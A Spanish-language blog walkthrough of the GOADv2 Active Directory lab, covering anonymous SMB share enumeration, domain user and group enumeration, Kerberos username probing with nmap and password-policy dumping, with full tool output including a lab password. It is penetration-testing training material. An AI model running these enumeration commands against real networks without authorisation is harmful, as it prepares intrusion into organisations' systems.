---
layout: single
title: Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)
comments: true
excerpt: "Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)"
date: 2023-08-18
classes: wide
header:
  teaser: /assets/images/2023-08-18-Solucion_GOADv2/logo.png
  teaser_home_page: true
categories:
  - Crackmes
tags:
  - Active Directory
  - Hacking
  - Entornos Empresariales
  - Easy
---


# Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)

En esta articulo, vamos a explorar las vulnerabilidades de 'Game Of Active Directory v2'. Veremos cómo atacar y resolver desafíos en castellano.

### [Mapa Mental](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)

1. [Recursos Compartidos](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#recursos-compartidos)
2. [Enumeración de usuarios](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#enumeraci%C3%B3n-de-usuarios)
3. [Políticas y datos con enum4linux](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#pol%C3%ADticas-y-datos-con-enum4linux)
4. [Buscar contraseñas con Usuarios Enumerados](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#buscar-contrase%C3%B1as-con-usuarios-enumerados)
    1. [ASREPRoast](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#asreproast)
    2. [Password Spray](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#password-spray)
5. [Enumeración Con Usuarios](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#enumeraci%C3%B3n-con-usuarios)
    1. [Dump con ldapdomaindump](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#dump-con-ldapdomaindump)
    2. [Kerberoasting](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#kerberoasting)

---

# Recursos Compartidos

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled.png)

Se puede hacer una revisión de los recursos compartidos con algunas herramientas como enum4linux con el comando  `enum4linux -a -u "" -p "" 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #enum4linux -a -u"" -p"" 192.168.56.23
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul  5 18:47:53 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.23
RID Range ........ 500-550,1000-1050
Username ......... '-p'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.23    |
 ===================================================== 
[+] Got domain/workgroup name: ESSOS

 ============================================= 
|    Nbtstat Information for 192.168.56.23    |
 ============================================= 
Looking up status of 192.168.56.23
	ESSOS           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	BRAAVOS         <00> -         B <ACTIVE>  Workstation Service
	BRAAVOS         <20> -         B <ACTIVE>  File Server Service

	MAC Address = 08-00-27-88-10-C9

 ====================================== 
|    Session Check on 192.168.56.23    |
 ====================================== 
[+] Server 192.168.56.23 allows sessions using username '-p', password ''

 ============================================ 
|    Getting domain SID for 192.168.56.23    |
 ============================================ 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] CB 53 47 64 C5 3E 7E 66   71 D4 5A 84 A4 82 0E 2B   .SGd.>~f q.Z....+
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.56.23    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.23 from smbclient: 
[+] Got OS info for 192.168.56.23 from srvinfo:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 0F DF 32 22 4E 7B 12 6F   DF 74 EB A8 FA C5 C0 6E   ..2"N{.o .t.....n
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 192.168.56.23    |
 ============================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 192.168.56.23    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	all             Disk      Basic RW share for all
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	IPC$            IPC       Remote IPC
	public          Disk      Basic Read share for all domain users
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.23
//192.168.56.23/ADMIN$	Mapping: DENIED, Listing: N/A
//192.168.56.23/all	Mapping: OK, Listing: OK
//192.168.56.23/C$	Mapping: DENIED, Listing: N/A
//192.168.56.23/CertEnroll	Mapping: OK	Listing: DENIED
//192.168.56.23/IPC$	[E] Can't understand response:
NT_STATUS_NO_SUCH_FILE listing \*
//192.168.56.23/public	Mapping: OK	Listing: DENIED

 ===================================================== 
|    Password Policy Information for 192.168.56.23    |
 ===================================================== 
[E] Unexpected error from polenum:
usage: polenum [-h] [--username USERNAME] [--password PASSWORD]
               [--domain DOMAIN] [--protocols [PROTOCOLS ...]]
               [enum4linux]
polenum: error: argument --domain/-d is required
[E] Failed to get password policy with rpcclient

 =============================== 
|    Groups on 192.168.56.23    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 192.168.56.23 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================== 
|    Getting printer info for 192.168.56.23    |
 ============================================== 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] E3 EA 1D 61 59 74 0A 37   1C BD AC 82 05 58 70 42   ...aYt.7 .....XpB
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Wed Jul  5 18:48:08 2023
```

También con la herramienta smbmap, al pasar el comando solo con el host, puede que de un error `smbmap -H 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbmap -H 192.168.56.23
[!] Authentication error on 192.168.56.23
```

Pero con un usuario invitado o con un usuario nulo, puede que el resultado sea diferente `smbmap -H 192.168.56.23 -u 'guest'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbmap -H 192.168.56.23 -u 'guest'
[+] IP: 192.168.56.23:445	Name: braavos.essos.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	all                                               	READ, WRITE	Basic RW share for all
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	IPC$                                              	READ ONLY	Remote IPC
	public                                            	NO ACCESS	Basic Read share for all domain users
```

Otra Herramienta que nos puede server es smbclient, con el comando `smbclient -N -L 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbclient -N -L 192.168.56.23

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	all             Disk      Basic RW share for all
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	IPC$            IPC       Remote IPC
	public          Disk      Basic Read share for all domain users
SMB1 disabled -- no workgroup available
```

y por último en estos ejemplo de herramientas podemos usar crackmapexec  con el comando `cme smb 192.168.56.10-23 -u '' -p '' --shares`  puede ser que nos de un error, para este ejemplo yo ejecuto el comando cme, ya que tengo el binario de crackmapexec 6.0.0 que se puede descargar desde este [Link](https://github.com/mpgn/CrackMapExec/releases/tag/v6.0.0)

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.10-23 -u '' -p '' --shares
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating shares: Error occurs while reading from remote(104)
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.23   445    BRAAVOS          [-] Error enumerating shares: Error occurs while reading from remote(104)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

Al igual que con smbmap, puede ser que con un usuario nulo o invitado obtengamos resultados diferentes. Estos comandos nos dan los mismos resultados. Existen muchas más herramientas que se pueden utilizar, pero para este caso solo vamos a utilizar éstas.

`cme smb 192.168.56.10-23 -u 'null' -p '' --shares`

`cme smb 192.168.56.10-23 -u 'guest' -p '' --shares`

`cme smb 192.168.56.10-23 -u 'a' -p '' --shares`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.10-23 -u 'null' -p '' --shares
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\null: 
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\null: STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

---

# Enumeración de Usuarios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%201.png)

Para la enumeración de usuarios, también podemos hacerlo con varias herramientas, como por ejemplo Crackmapexec, utilizando el siguiente comando: `cme smb 192.168.56.11 --users`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 --users
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating domain users using dc ip 192.168.56.11: NTLM needs domain\username and a password
SMB         192.168.56.11   445    WINTERFELL       [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

Enumerar usuarios con rpcclient cuando el servicio permite acceso anónimo.`rpcclient -U "NORTH\\" 192.168.56.11 -N`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcclient -U "NORTH\\" 192.168.56.11 -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

rpcclient $> enumdomgroups
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
rpcclient $>
```

También, si se tiene acceso anónimo, se pueden enumerar usuarios con net rpc mediante el comando.`net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc
```

Obtener una lista de usuarios desde la página.

```csharp
┌──(angussmoody㉿DESKTOP-97EIK9O)-[/mnt/c/Users/angussmoody]
└─$ curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' | sort -u > User_nort.txt
```

Vemos el resultado

```csharp
┌──(angussmoody㉿DESKTOP-97EIK9O)-[/mnt/c/Users/angussmoody]
└─$ cat User_nort.txt
alliser.thorne
archmaester.ebrose
arya.stark
balon.greyjoy
barristan.selmy
benjen.stark
beric.dondarrion
bran.stark
brienne.of
bronn
brother.ray
brynden.tully
catelyn.stark
cersei.lannister
daario.naharis
daenerys.targaryen
davos.seaworth
doran.martell
euron.greyjoy
gendry
gilly
grand.maester
grey.worm
high.priestess
high.sparrow
hodor
izembaro
jaime.lannister
jaqen.h’ghar
jeor.mormont
joffrey.baratheon
jon.snow
jorah.mormont
khal.drogo
lady.crane
lancel.lannister
loras.tyrell
lysa.arryn
maester.aemon
maester.luwin
mance.rayder
margaery.tyrell
melisandre
missandei
myrcella.baratheon
nym.sand
obara.sand
oberyn.martell
olenna.tyrell
orell
osha
podrick.payne
qyburn
ramsay.snow
randyll.tarly
renly.baratheon
rickon.stark
robb.stark
robert.baratheon
robin.arryn
roose.bolton
ros
samwell.tarly
sansa.stark
shae
stannis.baratheon
talisa.stark
theon.greyjoy
thoros.of
tommen.baratheon
tormund
trystane.martell
tyene.sand
tyrion.lannister
tywin.lannister
varys
viserys.targaryen
yara.greyjoy
ygritte
```

Pasar un listado desde Nmap con los comandos.

`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10`

`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 20:57 -05
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for sevenkingdoms.local (192.168.56.10)
Host is up (0.0018s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     joffrey.baratheon@sevenkingdoms.local
|     robert.baratheon@sevenkingdoms.local
|     stannis.baratheon@sevenkingdoms.local
|     jaime.lannister@sevenkingdoms.local
|     tywin.lannister@sevenkingdoms.local
|     renly.baratheon@sevenkingdoms.local
|_    cersei.lannister@sevenkingdoms.local
MAC Address: 08:00:27:9A:71:68 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 20:59 -05
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for essos.local (192.168.56.12)
Host is up (0.0016s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     daenerys.targaryen@essos.local
|     khal.drogo@essos.local
|     viserys.targaryen@essos.local
|_    jorah.mormont@essos.local
MAC Address: 08:00:27:90:F5:B0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

---

# Políticas y datos con enum4linux

Esto lo podemos realizar con la herramienta crackmapexec, utilizando el comando `cme smb 192.168.56.11 --pass-pol`.

La política de contraseñas indica que si fallamos 5 veces, las cuentas se bloquearán durante 5 minutos.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 --pass-pol
SMB         192.168.56.11   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    NONE             [+] Dumping password info for domain: NORTH
SMB         192.168.56.11   445    NONE             Minimum password length: 5
SMB         192.168.56.11   445    NONE             Password history length: 24
SMB         192.168.56.11   445    NONE             Maximum password age: 311 days 2 minutes 
SMB         192.168.56.11   445    NONE             
SMB         192.168.56.11   445    NONE             Password Complexity Flags: 000000
SMB         192.168.56.11   445    NONE             	Domain Refuse Password Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password Store Cleartext: 0
SMB         192.168.56.11   445    NONE             	Domain Password Lockout Admins: 0
SMB         192.168.56.11   445    NONE             	Domain Password No Clear Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password No Anon Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password Complex: 0
SMB         192.168.56.11   445    NONE             
SMB         192.168.56.11   445    NONE             Minimum password age: 1 day 4 minutes 
SMB         192.168.56.11   445    NONE             Reset Account Lockout Counter: 5 minutes 
SMB         192.168.56.11   445    NONE             Locked Account Duration: 5 minutes 
SMB         192.168.56.11   445    NONE             Account Lockout Threshold: 5
SMB         192.168.56.11   445    NONE             Forced Log off Time: Not Set
```

ver información con enum4linux como accesos anónimos, enumeración de usuarios, de grupos, políticas de contraseñas, entre otros.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #enum4linux 192.168.56.11
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul  4 20:37:45 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.11    |
 ===================================================== 
[+] Got domain/workgroup name: NORTH

 ============================================= 
|    Nbtstat Information for 192.168.56.11    |
 ============================================= 
Looking up status of 192.168.56.11
	WINTERFELL      <00> -         B <ACTIVE>  Workstation Service
	NORTH           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	NORTH           <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	WINTERFELL      <20> -         B <ACTIVE>  File Server Service
	NORTH           <1b> -         B <ACTIVE>  Domain Master Browser

	MAC Address = 08-00-27-A1-0A-76

 ====================================== 
|    Session Check on 192.168.56.11    |
 ====================================== 
[+] Server 192.168.56.11 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.56.11    |
 ============================================ 
Domain Name: NORTH
Domain Sid: S-1-5-21-1107438274-2790715175-3618822122
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 192.168.56.11    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.11 from smbclient: 
[+] Got OS info for 192.168.56.11 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 192.168.56.11    |
 ============================== 
index: 0x18ac RID: 0x456 acb: 0x00000210 Account: arya.stark	Name: (null)	Desc: Arya Stark
index: 0x18bf RID: 0x45b acb: 0x00010210 Account: brandon.stark	Name: (null)	Desc: Brandon Stark
index: 0x16f5 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x18c3 RID: 0x45d acb: 0x00000210 Account: hodor	Name: (null)	Desc: Brainless Giant
index: 0x18c7 RID: 0x460 acb: 0x00000210 Account: jeor.mormont	Name: (null)	Desc: Jeor Mormont
index: 0x18c4 RID: 0x45e acb: 0x00040210 Account: jon.snow	Name: (null)	Desc: Jon Snow
index: 0x18c0 RID: 0x45c acb: 0x00000210 Account: rickon.stark	Name: (null)	Desc: Rickon Stark
index: 0x18c6 RID: 0x45f acb: 0x00000210 Account: samwell.tarly	Name: (null)	Desc: Samwell Tarly (Password : Heartsbane)
index: 0x18bc RID: 0x45a acb: 0x00000210 Account: sansa.stark	Name: (null)	Desc: Sansa Stark
index: 0x18c8 RID: 0x461 acb: 0x00000210 Account: sql_svc	Name: (null)	Desc: sql service

user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

 ========================================== 
|    Share Enumeration on 192.168.56.11    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.11

 ===================================================== 
|    Password Policy Information for 192.168.56.11    |
 ===================================================== 

[+] Attaching to 192.168.56.11 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:192.168.56.11)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] NORTH
	[+] Builtin

[+] Password Info for Domain: NORTH

	[+] Minimum password length: 5
	[+] Password history length: 24
	[+] Maximum password age: 311 days 2 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 5 minutes 
	[+] Locked Account Duration: 5 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =============================== 
|    Groups on 192.168.56.11    |
 =============================== 

[+] Getting builtin groups:
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]

[+] Getting builtin group memberships:
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[AcrossTheSea] rid:[0x455]

[+] Getting local group memberships:
Group 'AcrossTheSea' (RID: 1109) has member: Couldn't lookup SIDs
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]

[+] Getting domain group memberships:
Group 'Domain Guests' (RID: 514) has member: NORTH\Guest
Group 'Stark' (RID: 1106) has member: NORTH\arya.stark
Group 'Stark' (RID: 1106) has member: NORTH\eddard.stark
Group 'Stark' (RID: 1106) has member: NORTH\catelyn.stark
Group 'Stark' (RID: 1106) has member: NORTH\robb.stark
Group 'Stark' (RID: 1106) has member: NORTH\sansa.stark
Group 'Stark' (RID: 1106) has member: NORTH\brandon.stark
Group 'Stark' (RID: 1106) has member: NORTH\rickon.stark
Group 'Stark' (RID: 1106) has member: NORTH\hodor
Group 'Stark' (RID: 1106) has member: NORTH\jon.snow
Group 'Domain Computers' (RID: 515) has member: NORTH\CASTELBLACK$
Group 'Domain Users' (RID: 513) has member: NORTH\Administrator
Group 'Domain Users' (RID: 513) has member: NORTH\vagrant
Group 'Domain Users' (RID: 513) has member: NORTH\krbtgt
Group 'Domain Users' (RID: 513) has member: NORTH\SEVENKINGDOMS$
Group 'Domain Users' (RID: 513) has member: NORTH\arya.stark
Group 'Domain Users' (RID: 513) has member: NORTH\eddard.stark
Group 'Domain Users' (RID: 513) has member: NORTH\catelyn.stark
Group 'Domain Users' (RID: 513) has member: NORTH\robb.stark
Group 'Domain Users' (RID: 513) has member: NORTH\sansa.stark
Group 'Domain Users' (RID: 513) has member: NORTH\brandon.stark
Group 'Domain Users' (RID: 513) has member: NORTH\rickon.stark
Group 'Domain Users' (RID: 513) has member: NORTH\hodor
Group 'Domain Users' (RID: 513) has member: NORTH\jon.snow
Group 'Domain Users' (RID: 513) has member: NORTH\samwell.tarly
Group 'Domain Users' (RID: 513) has member: NORTH\jeor.mormont
Group 'Domain Users' (RID: 513) has member: NORTH\sql_svc
Group 'Night Watch' (RID: 1107) has member: NORTH\jon.snow
Group 'Night Watch' (RID: 1107) has member: NORTH\samwell.tarly
Group 'Night Watch' (RID: 1107) has member: NORTH\jeor.mormont
Group 'Mormont' (RID: 1108) has member: NORTH\jeor.mormont
Group 'Group Policy Creator Owners' (RID: 520) has member: NORTH\Administrator

 ======================================================================== 
|    Users on 192.168.56.11 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================== 
|    Getting printer info for 192.168.56.11    |
 ============================================== 
